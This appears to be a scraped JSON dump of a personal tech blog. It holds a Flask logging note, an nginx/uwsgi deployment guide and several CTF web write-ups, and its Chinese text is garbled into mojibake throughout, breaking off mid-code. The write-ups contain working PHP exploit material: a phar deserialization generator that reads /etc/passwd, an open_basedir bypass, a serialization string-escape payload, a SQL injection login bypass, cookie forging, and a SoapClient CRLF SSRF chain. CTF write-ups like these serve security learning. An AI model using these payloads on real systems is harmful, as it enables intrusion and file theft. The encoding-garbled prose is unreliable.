åœ¨åˆå§‹åŒ–appæ—¶,ä¾¿åˆ›å»ºäº†ä¸€ä¸ªapp.nameçš„æ—¥å¿—è®°å½•å™¨,å…¶æ˜¯ç»§æ‰¿äºpythonçš„loggingæ¨¡å—çš„ è¯¥è®°å½•å™¨å·²ç»æ·»åŠ ä¸€ä¸ªdefault_handler å†™ä¸€ä¸ªå°åŠŸèƒ½:flaskå®ç°ç±»ä¼¼nginxçš„access.log 12345678910111213141516171819202122232425262728293031323334from flask import Flask, requestfrom flask.logging import default_handlerfrom logging import Formatter, INFOfrom logging.handlers import RotatingFileHandlerapp &#x3D; Flask(__name__)app.debug &#x3D; True# ä¸»è·¯ç”±index page@app.route(&#39;&#x2F;&#39;, methods&#x3D;[&#39;Get&#39;])def index(): return &quot;hello&quot;# åœ¨æ¯ä¸€æ¬¡è¯·æ±‚å‰æ‰§è¡Œ@app.before_requestdef log_each_request(): params &#x3D; request.args if request.args is None else &#39;&#39; app.logger.info(&#39;&#123;&#125;-&#123;&#125;-&#123;&#125;&#39;.format(request.method, request.path, params))if __name__ &#x3D;&#x3D; &#39;__main__&#39;: # æ—¥å¿—æ ¼å¼åŒ–ç±» è®°å½•æ—¶é—´ ç­‰çº§ ä»£ç è¡Œ æ—¥å¿—ä¿¡æ¯ formatter &#x3D; Formatter(&#39;%(asctime)s - %(levelname)s - %(lineno)d - %(message)s&#39;) info_log_path &#x3D; &#39;logs&#x2F;flask.log&#39; # è‡ªåŠ¨åˆ†å‰²æ—¥å¿—åŠŸèƒ½çš„Handler file_handler &#x3D; RotatingFileHandler(info_log_path, maxBytes&#x3D;10 * 1024 * 1024, backupCount&#x3D;10) file_handler.setFormatter(formatter) file_handler.setLevel(INFO) if not app.debug: app.logger.removeHandler(default_handler) app.logger.addHandler(file_handler) app.run() å¦‚æœæˆ‘ä»¬å°†è¿™è¡Œä»£ç æ³¨é‡Šæ‰ app.debug=Trueçš„æƒ…å†µä¸‹ï¼Œæ—¥å¿—å¯ä»¥è¾“å‡ºï¼Œä½†æ˜¯ä¼šå°†æ§åˆ¶å°æ‰€æœ‰çš„ä¿¡æ¯éƒ½è¾“å‡ºåˆ°æ—¥å¿—æ–‡ä»¶ï¼Œè¿™æ˜¯æˆ‘ä»¬ä¸æƒ³çš„ï¼Œæˆ‘ä»¬åªæƒ³è¦app.logger.infoå†™çš„å†…å®¹ã€‚ app.debug=Falseçš„æƒ…å†µä¸‹ï¼Œæ—¥å¿—ä¸å·¥ä½œäº†ï¼Œä¹‹å‰è¿˜èƒ½å…¨éƒ¨è¾“å‡ºåªæ˜¯æœ‰äº›æ˜¯æˆ‘ä»¬ä¸æƒ³è¦çš„ï¼Œç°åœ¨éƒ½æ²¡äº†ï¼Œå°±å¥½åƒå¥³æœ‹å‹è¯´åˆ†æ‰‹å°±åˆ†æ‰‹ã€‚ Whyï¼Ÿè·Ÿè¿›default_handler default_handleræ˜¯ä¸€ä¸ªStreamHandlerï¼Œå°†æ—¥å¿—è®°å½•è¾“å‡ºå‘é€åˆ°æµï¼Œä¾‹å¦‚sys.stdoutï¼Œsys.stderræˆ–ä»»ä½•ç±»ä¼¼æ–‡ä»¶çš„å¯¹è±¡ï¼ˆæˆ–æ›´å‡†ç¡®åœ°è¯´ï¼Œæ˜¯æ”¯æŒwrite() å’Œflush()æ–¹æ³•çš„ä»»ä½•å¯¹è±¡ï¼‰ æ‰€ä»¥æ§åˆ¶å°çš„è¾“å‡ºä¹Ÿä¼šä¸€èµ·è¾“å‡ºè‡³ä½ çš„æ–‡ä»¶äº† app.debugé—®é¢˜ï¼šåº”ç”¨ç¨‹åºæ§åˆ¶å°ä¸­çœ‹åˆ°çš„è¾“å‡ºæ¥è‡ªåº•å±‚çš„Werkzeugè®°å½•å™¨ï¼Œæ²¡æœ‰è®¾ç½®logleveï¼Œæ—¥å¿—å°±æ²¡æœ‰äº†ã€‚ ç„¶åç„¶åï¼Œç„¶åå¹²å˜›ï¼Ÿ ç„¶åå°±å»ç©å‘€ğŸ˜","tags":[{"name":"Note","slug":"Note","permalink":"https://yanmymickey.github.io/tags/Note/"},{"name":"python","slug":"python","permalink":"https://yanmymickey.github.io/tags/python/"},{"name":"flask","slug":"flask","permalink":"https://yanmymickey.github.io/tags/flask/"}]},{"title":"éƒ¨ç½²nginx+uwsgi+flask","date":"2020-08-05T16:00:00.000Z","path":"2020/08/06/Note/éƒ¨ç½²nginx+uwsgi+flask/","text":"éƒ¨ç½²nginx+uwsgi+flaskæœåŠ¡å™¨é…ç½®Centos7.6 python3.7 nginx 1.12 é¡¹ç›®æ–‡ä»¶é¡¹ç›®æ–‡ä»¶æœ€å¥½æ”¾åœ¨ä¸€ä¸ªæƒé™è¾ƒä½çš„ç›®å½•ï¼Œå½“ç„¶ï¼Œé…ç½®å¥½æƒé™ä¹Ÿæ˜¯å¯ä»¥çš„ å°†flaské¡¹ç›®é€šè¿‡ftpæˆ–è€…gitä¸Šä¼ åˆ°/home/project uwsgiè™šæ‹Ÿç¯å¢ƒä»€ä¹ˆæ˜¯è™šæ‹Ÿç¯å¢ƒ? virtualenv - å»–é›ªå³° ç®€è€Œè¨€ä¹‹å°±æ˜¯å°†å½“å‰é¡¹ç›®éœ€è¦ç”¨åˆ°çš„ä¸€äº›ç¬¬ä¸‰æ–¹åº“åˆ†å¼€å­˜å‚¨ï¼Œä¸ç›´æ¥æ”¾ç½®åˆ°ç³»ç»Ÿç›®å½•ï¼Œè¿™æ ·å¯ä»¥ä¿è¯ç¯å¢ƒçš„ç‹¬ç«‹æ€§å’Œç¨³å®šæ€§ï¼Œç³»ç»Ÿç›®å½•ä¸­çš„åº“å‡çº§ä¸ä¼šå½±å“åˆ°é¡¹ç›®ã€‚ æ–°å»ºè™šæ‹Ÿç¯å¢ƒ123456789# å®‰è£…pip3 install virtualenv# è¿›å…¥é¡¹ç›®ç›®å½•cd &#x2F;home&#x2F;project# æ›´æ”¹ç›®å½•æ‰€æœ‰è€…sudo chown -R yourUserName:yourUserName é¡¹ç›®è·¯å¾„&#x2F;cd é¡¹ç›®è·¯å¾„&#x2F;# æ–°å»ºè™šæ‹Ÿç¯å¢ƒï¼Œä¿å­˜å½“å‰é¡¹ç›®æ‰€éœ€ä¾èµ– sudo virtualenv venv è¿›å…¥è™šæ‹Ÿç¯å¢ƒ1source venv&#x2F;bin&#x2F;activate å®‰è£…ä¾èµ–12345# è™šæ‹Ÿç¯å¢ƒä¸­å°±ä¸è¦ç”¨sudoäº†ï¼Œä¸ç„¶åˆæ˜¯è°ƒç”¨ç³»ç»Ÿç›®å½•çš„pipäº†# åœ¨è™šæ‹Ÿç¯å¢ƒä¸­å®‰è£…é¡¹ç›®æ‰€éœ€ä¾èµ–pip install -r requirements.txt# åœ¨è™šæ‹Ÿç¯å¢ƒä¸­å®‰è£… uwsgi å’Œ uwsgiçš„çŠ¶æ€ç›‘æ§å™¨pip install uwsgi uwsgitop ç¼–å†™uwsgié…ç½®æ–‡ä»¶123456789101112131415161718192021222324252627282930313233343536373839404142434445464748vim uwsgi.ini[uwsgi]# python å¯åŠ¨ç¨‹åºæ–‡ä»¶ app.runæ‰€åœ¨çš„æ–‡ä»¶åwsgi-file &#x3D; # python ç¨‹åºå†…ç”¨ä»¥å¯åŠ¨çš„å˜é‡å appcallable &#x3D; app# è¿›ç¨‹æ•°processes &#x3D; 5# çº¿ç¨‹æ•°threads &#x3D; 2#ä¸»è¿›ç¨‹master&#x3D;true# æŒ‡å‘ç½‘ç«™ç›®å½•chdir&#x3D;&#x2F;home&#x2F;project&#x2F;é¡¹ç›®è·¯å¾„&#x2F;# socketæ–‡ä»¶ï¼Œé…ç½®nginxæ—¶å€™ä½¿ç”¨ # ä¹Ÿå¯ä»¥å†™å‡ºip:portç«¯å£æ¨¡å¼# æ¯”å¦‚ 127.0.0.1:5001# ç«¯å£æ¨¡å¼çš„è¯nginxä¹Ÿè¦ä¸€ä¸ªç«¯å£,å°±æŒºå•°å—¦çš„socket&#x3D;%(chdir)&#x2F;uwsgi&#x2F;uwsgi.sock chmod-socket&#x3D;666#httpæ¨¡å¼,ä¸éœ€è¦é…åˆnginxå³å¯å•ç‹¬ä½¿ç”¨#ä½†æ˜¯nginxæ˜¯cç¼–å†™çš„,è§£æhttpè¯·æ±‚çš„æ•ˆç‡è¦é«˜å¾ˆå¤š#å»ºè®®ä½¿ç”¨socketåŠ nginxçš„æ¨¡å¼#http&#x3D;0.0.0.0:5001# statusæ–‡ä»¶ï¼Œå¯ä»¥æŸ¥çœ‹uwsgiçš„è¿è¡ŒçŠ¶æ€stats&#x3D;%(chdir)&#x2F;uwsgi&#x2F;uwsgi.status # pidæ–‡ä»¶ï¼Œé€šè¿‡è¯¥æ–‡ä»¶å¯ä»¥æ§åˆ¶uwsgiçš„é‡å¯å’Œåœæ­¢ pidfile&#x3D;%(chdir)&#x2F;uwsgi&#x2F;uwsgi.pid # æ—¥å¿—æ–‡ä»¶ï¼Œé€šè¿‡è¯¥æ–‡ä»¶æŸ¥çœ‹uwsgiåå°è¿è¡Œçš„æ—¥å¿—daemonize&#x3D;%(chdir)&#x2F;uwsgi&#x2F;uwsgi.log logfile-chmod&#x3D;644# uid&#x3D;# gid&#x3D;# uwsgiçš„è¿›ç¨‹åç§°å‰ç¼€# procname-prefix-spaced&#x3D;mysite # pyæ–‡ä»¶ä¿®æ”¹è‡ªåŠ¨åŠ è½½,ç”Ÿæˆç¯å¢ƒä¸å»ºè®®å¼€å¯#py-autoreload&#x3D;true buffer-size &#x3D; 32768 å¯åœuwsgi1234567# è™šæ‹Ÿç¯å¢ƒè¿è¡Œ# å¯åŠ¨uwsgi --ini uwsgi.ini # é‡å¯uwsgi --reload uwsgi.pid # å…³é—­uwsgi --stop uwsgi.pid æœåŠ¡ç›‘æ§ è¯»å–uwsgiå®æ—¶çŠ¶æ€,jsonå­—ç¬¦ä¸²å½¢å¼ 12# è™šæ‹Ÿç¯å¢ƒè¿è¡Œuwsgi --connect-and-read uwsgi&#x2F;uwsgi.status uwsgitop 12# è™šæ‹Ÿç¯å¢ƒè¿è¡Œuwsgitop uwsgi&#x2F;uwsgi.status é€€å‡ºè™šæ‹Ÿç¯å¢ƒ1deactivate nginxå®‰è£…ç¼–è¯‘å®‰è£…æˆ–è€…ç”¨åŒ…ç®¡ç†å®‰è£…éƒ½æ˜¯å¯ä»¥çš„ï¼Œæ»¡è¶³é¡¹ç›®éœ€æ±‚å°±å¯ä»¥ 1yum install nginx é…ç½®æ–‡ä»¶ç›®å½•ï¼š/etc/nginx é…ç½®æ–‡ä»¶: /etc/nginx/nginx.conf ç«™ç‚¹æ–‡ä»¶æºæ–‡ä»¶ï¼š/etc/nginx/sites-available ç«™ç‚¹æ–‡ä»¶æ¿€æ´»æ–‡ä»¶å¤¹ï¼š/etc/nginx/sites-enabled è¯´æ˜ï¼š centos yumå®‰è£…çš„nginxæ˜¯æ²¡ç”¨ä¸‹é¢ä¿©ä¸ªç«™ç‚¹ç›®å½•çš„ï¼Œæ‰‹åŠ¨åˆ›å»ºï¼Œç„¶ååœ¨nginx.confä¸­include/etc/nginx/sites-enabled/* å°†ç«™ç‚¹æ–‡ä»¶æºæ–‡ä»¶å†™åœ¨sites-availableç›®å½•ï¼Œæ·»åŠ è½¯é“¾æ¥åˆ°sites-enabledï¼Œå¦‚è‹¥è¦å…³é—­ç«™ç‚¹ï¼Œåªéœ€è¦å°† sites-enabledç›®å½•ä¸‹çš„è½¯é“¾æ¥åˆ é™¤å³å¯ æ—¥å¿—ç›®å½•ï¼š/var/log/nginx/ é…ç½®ç«™ç‚¹1234567891011121314151617181920212223242526cd &#x2F;etc&#x2F;nginx&#x2F;sites-available&#x2F;sudo vim é¡¹ç›®åç§°.confserver &#123; # æœ‰åŸŸåå°±é…ç½®server_nameä¸ºåŸŸå,ç«¯å£ç›‘å¬80 # ç›‘å¬ç«¯å£ listen 5001; server_name localhost; access_log &#x2F;var&#x2F;log&#x2F;project_name&#x2F;project_name_access.log; error_log &#x2F;var&#x2F;log&#x2F;project_name&#x2F;project_name_error.log index index.html; #åŠ¨æ€è¯·æ±‚ location &#x2F; &#123; include uwsgi_params; uwsgi_pass unix:&#x2F;&#x2F;&#x2F;home&#x2F;project&#x2F;é¡¹ç›®åç§°&#x2F;uwsgi&#x2F;uwsgi.sock; &#125;&#125;#åˆ›å»ºè½¯é“¾æ¥sudo ln -s &#x2F;etc&#x2F;nginx&#x2F;sites-available&#x2F;é¡¹ç›®åç§°.conf &#x2F;etc&#x2F;nginx&#x2F;sites-enabled&#x2F;é¡¹ç›®åç§°.conf#æ£€éªŒé…ç½®æ–‡ä»¶sudo nginx -tsudo systemctl restart nginx.service æœ€åè®¿é—®ç«™ç‚¹æ˜¯å¦å¯ä»¥è®¿é—® æ’æŸ¥é—®é¢˜å‚è€ƒ äº‘æœåŠ¡å™¨ç¡®è®¤ç«¯å£æ˜¯å¦å¼€å¯å¯è®¿é—® æœåŠ¡å™¨æœ¬åœ°æ˜¯å¦å¯è®¿é—® curl http://127.0.0.1:port æœ‰å“åº”æ£€æŸ¥æœåŠ¡å™¨ç«¯å£ï¼Œæ— å“åº”æ£€æŸ¥nginx ipï¼športæ˜¯å¦å¯è®¿é—® æœ‰å“åº”ï¼Œä½†æ˜¯åªæ˜¯å‡ºç°nginxï¼Œæ£€æŸ¥uwsgi æ— å“åº”ï¼Œæ£€æŸ¥æœåŠ¡å™¨ç«¯å£ï¼Œç„¶åå†æ£€æŸ¥nginx æ³¨æ„æƒé™é—®é¢˜å¼•å‘çš„æ—¥å¿—æˆ–è€…ç¨‹åºæ‹’ç»æœåŠ¡500ç­‰é”™è¯¯ç ","tags":[{"name":"Note","slug":"Note","permalink":"https://yanmymickey.github.io/tags/Note/"},{"name":"python","slug":"python","permalink":"https://yanmymickey.github.io/tags/python/"},{"name":"flask","slug":"flask","permalink":"https://yanmymickey.github.io/tags/flask/"},{"name":"linux","slug":"linux","permalink":"https://yanmymickey.github.io/tags/linux/"}]},{"title":"[NCTF2019]phar matches everything","date":"2020-05-01T16:00:00.000Z","path":"2020/05/02/CTF_WP/[NCTF2019]phar matches everything/","text":"[NCTF2019]phar matches everything åˆ†ææºç  12345678910111213141516171819202122232425262728293031323334&lt;?phpclass Easytest&#123; protected $test; public function funny_get()&#123; return $this-&gt;test; &#125;&#125;class Main &#123; public $url; public function curl($url)&#123; $ch &#x3D; curl_init(); curl_setopt($ch,CURLOPT_URL,$url); curl_setopt($ch,CURLOPT_RETURNTRANSFER,true); $output&#x3D;curl_exec($ch); curl_close($ch); return $output; &#125;public function __destruct()&#123; $this_is_a_easy_test&#x3D;unserialize($_GET[&#39;careful&#39;]); if($this_is_a_easy_test-&gt;funny_get() &#x3D;&#x3D;&#x3D; &#39;1&#39;)&#123; echo $this-&gt;curl($this-&gt;url); &#125; &#125; &#125;if(isset($_POST[&quot;submit&quot;])) &#123; $check &#x3D; getimagesize($_POST[&#39;name&#39;]); if($check !&#x3D;&#x3D; false) &#123; echo &quot;File is an image - &quot; . $check[&quot;mime&quot;] . &quot;.&quot;; &#125; else &#123; echo &quot;File is not an image.&quot;; &#125;&#125;?&gt; ä¸¤æ¬¡åºåˆ—åŒ–ç¬¬ä¸€ä¸ªæ˜¯åˆ©ç”¨getimagesize($file_path)è§¦å‘pharååºåˆ—åŒ–ï¼Œè§¦å‘çš„ååºåˆ—åŒ–å½±å“Mainç±» ç¬¬äºŒä¸ªå¾ˆç®€å•,è¦æ˜¯Easytestä¸­çš„test=1 åˆ©ç”¨curlè¯»å–æ–‡ä»¶ exp.php 12345678910111213141516171819202122&lt;?phpclass Easytest &#123; protected $test &#x3D; &#39;1&#39;;&#125;class Main &#123; public $url &#x3D;&#39;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&#39;;&#125;$a &#x3D; new Easytest();echo serialize($a);echo urlencode(serialize($a));$b &#x3D; new Main();@unlink(&quot;exp.phar&quot;);$phar &#x3D; new Phar(&quot;phar.phar&quot;);$phar-&gt;startBuffering();$phar-&gt;setStub(&#39;GIF89a&#39; . &quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);$phar-&gt;setMetadata($b);$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;);$phar-&gt;stopBuffering();rename(&#39;exp.char&#39;, &quot;exp.gif&quot;); é¦–å…ˆä¸Šä¼ exp.gif ç„¶ååˆ©ç”¨catchmime.phpä¼ å‚è§¦å‘ååºåˆ—åŒ– carefulç”¨æ¥è§¦å‘2 1name&#96;ç”¨æ¥è§¦å‘&#96;phar æ”¹å˜urlè¯»å–hosts,å› ä¸ºè¿™é“é¢˜æƒ³è®©æˆ‘ä»¬æ‰“å†…ç½‘ æˆ‘è¯»å–åˆ°äº†173.187.197.10,å†ç”¨httpåè®®è¯»ä¸€ä¸‹http://173.187.197.10,å‘ç°å°±æ˜¯å½“å‰é¡µé¢,å†è¯»ä¸€ä¸‹ http://173.187.197.11 php-fpmæœªæˆæƒæ¼æ´php-fpmæœªæˆæƒæ¼æ´ ä½¿ç”¨é“¾æ¥ä¸­çš„exp å†ä½¿ç”¨gopheråè®®ä½¿ç”¨expç”Ÿæˆçš„payload å…ˆæ‰“phpinfo();å¯ä»¥å¾—çŸ¥éœ€è¦ç»•è¿‡open_basedir åŠ ä¸Šç»•è¿‡open_basedirçš„payloadå°±å¯ä»¥äº† 1&lt;?php mkdir(&#39;&#x2F;tmp&#x2F;fuck&#39;);chdir(&#39;&#x2F;tmp&#x2F;fuck&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);print_r(scandir(&#39;&#x2F;&#39;));readfile(&#39;&#x2F;flag&#39;);?&gt; flagåœ¨æ ¹ç›®å½• Reference[NCTF2019]phar matches everything(pharååºåˆ—åŒ–)","tags":[{"name":"CTF","slug":"CTF","permalink":"https://yanmymickey.github.io/tags/CTF/"},{"name":"PHP","slug":"PHP","permalink":"https://yanmymickey.github.io/tags/PHP/"},{"name":"WP","slug":"WP","permalink":"https://yanmymickey.github.io/tags/WP/"},{"name":"ååºåˆ—åŒ–","slug":"ååºåˆ—åŒ–","permalink":"https://yanmymickey.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}]},{"title":"å®‰æ’2020å››æœˆèµ›","date":"2020-04-24T16:00:00.000Z","path":"2020/04/25/CTF_WP/å®‰æ’2020å››æœˆèµ›/","text":"å®‰æ’2020å››æœˆèµ›åªä¼šåšåšç®€å•é¢˜æ··æ··åˆ†ğŸ˜¢ web112345678910111213141516171819202122232425262728293031323334353637383940414243&lt;?phpshow_source(&quot;index.php&quot;);function write ($data) &#123; return str_replace(chr(0) . &#39;*&#39; . chr(0), &#39;\\0\\0\\0&#39;, $data);&#125;function read ($data) &#123; return str_replace(&#39;\\0\\0\\0&#39;, chr(0) . &#39;*&#39; . chr(0), $data);&#125;class A &#123; public $username; public $password; function __construct ($a, $b) &#123; $this-&gt;username &#x3D; $a; $this-&gt;password &#x3D; $b; &#125;&#125;class B &#123; public $b &#x3D;&quot;gpy&quot;; function __destruct () &#123; $c &#x3D; &#39;a&#39; . $this-&gt;b; echo $c; &#125;&#125;class C &#123; public $c; function __toString () &#123; &#x2F;&#x2F;flag.php echo file_get_contents($this-&gt;c); return &#39;nice&#39;; &#125;&#125;$a &#x3D; new A($_GET[&#39;a&#39;],$_GET[&#39;b&#39;]);$b &#x3D; unserialize(read(write(serialize($a))));function read ($data) &#123; return str_replace(&#39;\\0\\0\\0&#39;, chr(0) . &#39;*&#39; . chr(0), $data);&#125; readå‡½æ•°å°†chr(0) . &#39;*&#39; . chr(0)å˜ä¸º\\0\\0\\0,ä½†æ˜¯å‰è€…åªæœ‰ä¸‰ä¸ªå­—ç¬¦,åè€…æœ‰å…­ä¸ªå­—ç¬¦,é‚£ä¹ˆå°±ä¼šå¯¼è‡´å­—ç¬¦é€ƒé€¸ã€‚ payload 1?a&#x3D;\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0&amp;b&#x3D;;s:&quot;;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;&#125;&#125;&#125; MISC6Gç­¾åˆ°1curl --range 0-100 http:&#x2F;&#x2F;balabala&#x2F;1Gfile.file MISC1ä¸‹è½½æ˜¯ä¸ªæµé‡åŒ… ç®€å•æµè§ˆä¸€ä¸‹ï¼Œæ˜¯è“ç‰™çš„æµé‡ã€‚ å…ˆæŒ‰åè®®æ’ä¸€ä¸‹åº æ‰¾è“ç‰™çš„ä¼ è¾“åè®®OBEX æŠŠ7zå‹ç¼©åŒ…çš„æ•°æ®å—å¤åˆ¶å‡ºæ¥ï¼Œç”¨winhexæˆ–è€…010editorä¿å­˜æˆ7zæ–‡ä»¶ï¼Œè§£å‹ï¼Œè¦PIN å»æ‰è¿‡æ»¤å™¨ï¼Œctrl+fæŸ¥æ‰¾ä¸€ä¸‹æœ‰æ²¡æœ‰PINï¼Œå‘ç°æœ‰çš„ï¼Œè§£å‹å¾—åˆ°flag å¥½å¥½å­¦ä¹ ï¼Œå¤©å¤©å‘ä¸Š","tags":[{"name":"CTF","slug":"CTF","permalink":"https://yanmymickey.github.io/tags/CTF/"},{"name":"WP","slug":"WP","permalink":"https://yanmymickey.github.io/tags/WP/"}]},{"title":"[SWPU2019]Web6","date":"2020-04-17T16:00:00.000Z","path":"2020/04/18/CTF_WP/SWPU2019Web6/","text":"[SWPU2019]Web6SQLæ³¨å…¥æ–¹æ³•ä¸€éªŒè¯æœºåˆ¶æ˜¯ç”¨æˆ·åå’Œå¯†ç åˆ†å¼€å•ç‹¬éªŒè¯ï¼Œå¹¶ä¸”æ²¡æœ‰æ£€æŸ¥ç©ºå¯†ç  payload 1username&#x3D;1&#39; or &#39;1&#39;&#x3D;&#39;1&#39; group by passwd with rollup having passwd is NULL#&amp;passwd&#x3D; æŸ¥å‡ºæ¥ä¸€ä¸ªç”¨æˆ·å¹¶ä¸”å¯†ç ä¸ºç©ºï¼Œæ­£å¥½å¯ä»¥å’Œpasswdæ²¡æœ‰ä¼ å€¼æ˜¯NULLç›¸åŒ¹é… æ–¹æ³•äºŒå†™è„šæœ¬æ³¨å…¥ï¼Œå‚è€ƒ SWPU2019-Webé¢˜è§£ ä¼ªé€ adminç™»é™†ä¸ŠåæŸ¥çœ‹cookieï¼Œç„¶åæŸ¥çœ‹wsdl.php è°ƒç”¨get_flagæç¤º æ‰¾åˆ°è¯»å–æ–‡ä»¶çš„æ–¹æ³•ï¼Œè¿˜æœ‰ä¸€ä¸ªhintï¼Œäºæ˜¯ä¾æ¬¡è¯»å–index.phpï¼Œencode.phpï¼Œinterface.phpï¼Œse.php keyaaaaaaaasdfsaf.txt ï¼ˆä¸çŸ¥ä¸ºä½•Chromeçš„HackbarPOSTä¸ç®¡ç”¨ï¼‰ encode.phpæ˜¯å¯¹cookiesçš„åŠ å¯†ï¼Œuser=åé¢çš„å­—ç¬¦ä¸²ä¸ºåŠ å¯†åçš„å†…å®¹ å†™å‡ºè§£å¯†è„šæœ¬ï¼Œç„¶åä¼ªé€ æˆadminï¼Œkeyä¸ºtxtä¸­çš„å†…å®¹ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960function decrypt($data, $key)&#123; $key &#x3D; md5($key); $x &#x3D; 0; $data &#x3D; base64_decode($data); $len &#x3D; strlen($data); $l &#x3D; strlen($key); $char &#x3D; &#39;&#39;; for ($i &#x3D; 0; $i &lt; $len; $i++) &#123; if ($x &#x3D;&#x3D; $l) &#123; $x &#x3D; 0; &#125; $char .&#x3D; substr($key, $x, 1); $x++; &#125; $str &#x3D; &#39;&#39;; for ($i &#x3D; 0; $i &lt; $len; $i++) &#123; if (ord(substr($data, $i, 1)) &lt; ord(substr($char, $i, 1))) &#123; $str .&#x3D; chr((ord(substr($data, $i, 1)) + 256) - ord(substr($char, $i, 1))); &#125; else &#123; $str .&#x3D; chr(ord(substr($data, $i, 1)) - ord(substr($char, $i, 1))); &#125; &#125; return $str;&#125;function en_crypt($content,$key)&#123; $key &#x3D; md5($key); $h &#x3D; 0; $length &#x3D; strlen($content); $swpuctf &#x3D; strlen($key); $varch &#x3D; &#39;&#39;; for ($j &#x3D; 0; $j &lt; $length; $j++) &#123; if ($h &#x3D;&#x3D; $swpuctf) &#123; $h &#x3D; 0; &#125; $varch .&#x3D; $key&#123;$h&#125;; $h++; &#125; $swpu &#x3D; &#39;&#39;; for ($j &#x3D; 0; $j &lt; $length; $j++) &#123; $swpu .&#x3D; chr(ord($content&#123;$j&#125;) + (ord($varch&#123;$j&#125;)) % 256); &#125; return base64_encode($swpu);&#125;$key&#x3D;&quot;flag&#123;this_is_false_flag&#125;&quot;;$data&#x3D;&quot;3J6Roahxag&#x3D;&#x3D;&quot;;echo decrypt($data,$key);$admin&#x3D;&quot;admin:1&quot;;echo en_crypt($admin,$key); æ”¹cookieåå˜æˆwelcome adminï¼ŒæˆåŠŸä¼ªé€ æˆadmin SSRFå› ä¸ºè¦127.0.0.1,å¾ˆå®¹æ˜“è”æƒ³åˆ°SSRF åœ¨se.phpä¸­å­˜åœ¨å…³é”®ä»£ç  1ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;); äºæ˜¯æƒ³åˆ°sessionååºåˆ—åŒ–,åˆè¦ssrf,æƒ³åˆ°åˆ©ç”¨Soapè¿›è¡ŒSSRF getflagæ–¹æ³•æ€»çš„æ¥è¯´å°±æ˜¯æ„é€ æ–‡ä»¶ä¸Šä¼ å†™å…¥sessionæ–‡ä»¶ï¼Œç„¶ååˆ©ç”¨session ååºåˆ—åŒ–ï¼Œç”Ÿæˆä¸€ä¸ªsoapclient å¯¹è±¡,ç„¶ååŠ ä¸Šcrlfè®¾ç½®cookie,è¿›è¡Œè¶Šæƒ ssrf ä¸Šä¼ SESSIONSoapååºåˆ—åŒ–å†™å…¥SESSION 123456789101112131415161718$target &#x3D; &#39;http:&#x2F;&#x2F;127.0.0.1&#x2F;interface.php&#39;;$post_string &#x3D; &#39;a&#x3D;1&amp;b&#x3D;2&#39;;$headers &#x3D; array( &#39;X-Forwarded-For: 127.0.0.1&#39;, &#39;Cookie: user&#x3D;xZmdm9NxaQ&#x3D;&#x3D;&#39;,);$b &#x3D; new SoapClient(null, array(&#39;location&#39; &#x3D;&gt; $target, &#39;user_agent&#39; &#x3D;&gt; &#39;wupco^^Content-Type: application&#x2F;x-www-form-urlencoded^^&#39; . join(&#39;^^&#39;, $headers), &#39;uri&#39; &#x3D;&gt; &quot;aaab&quot;));$aaa &#x3D; serialize($b);$aaa &#x3D; str_replace(&#39;^^&#39;, &quot;\\r\\n&quot;, $aaa);$aaa &#x3D; str_replace(&#39;&amp;&#39;, &#39;&amp;&#39;, $aaa);echo $aaa;&#x2F;&#x2F;ç»“æœO:10:&quot;SoapClient&quot;:5:&#123;s:3:&quot;uri&quot;;s:4:&quot;aaab&quot;;s:8:&quot;location&quot;;s:30:&quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;interface.php&quot;;s:15:&quot;_stream_context&quot;;i:0;s:11:&quot;_user_agent&quot;;s:109:&quot;wupcoContent-Type: application&#x2F;x-www-form-urlencodedX-Forwarded-For: 127.0.0.1Cookie: user&#x3D;xZmdm9NxaQ&#x3D;&#x3D;&quot;;s:13:&quot;_soap_version&quot;;i:1;&#125; æœ¬åœ°å†™ä¸€ä¸ªhtmlé¡µé¢ç”¨äºä¸Šä¼ æ–‡ä»¶,åˆ©ç”¨session.upload_progresså†™å…¥session 123456789&lt;html&gt;&lt;body&gt; &lt;form action&#x3D;&quot;http:&#x2F;&#x2F;905705f8-b6ff-431a-b953-c2c5ff0d70ed.node3.buuoj.cn&#x2F;index.php&quot; method&#x3D;&quot;POST&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt; &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value&#x3D;&quot;1&quot; &#x2F;&gt; &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file&quot; &#x2F;&gt; &lt;input type&#x3D;&quot;submit&quot; &#x2F;&gt; &lt;&#x2F;form&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt; æŠ“åŒ…ä¿®æ”¹ è§¦å‘SESSIONååºåˆ—åŒ–1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071class aa &#123; public $mod1; public $mod2; public function __call ($name, $param) &#123; if ($this-&gt;&#123;$name&#125;) &#123; $s1 &#x3D; $this-&gt;&#123;$name&#125;; $s1(); &#125; &#125; public function __get ($ke) &#123; return $this-&gt;mod2[$ke]; &#125;&#125;class bb &#123; public $mod1; public $mod2; public function __destruct () &#123; $this-&gt;mod1-&gt;test2(); &#125;&#125;class cc &#123; public $mod1; public $mod2; public $mod3; public function __invoke () &#123; $this-&gt;mod2 &#x3D; $this-&gt;mod3 . $this-&gt;mod1; &#125;&#125;class dd &#123; public $name; public $flag; public $b; public function getflag () &#123; session_start(); var_dump($_SESSION); $a &#x3D; array(reset($_SESSION), $this-&gt;flag); echo call_user_func($this-&gt;b, $a); &#125;&#125;class ee &#123; public $str1; public $str2; public function __toString () &#123; $this-&gt;str1-&gt;&#123;$this-&gt;str2&#125;(); return 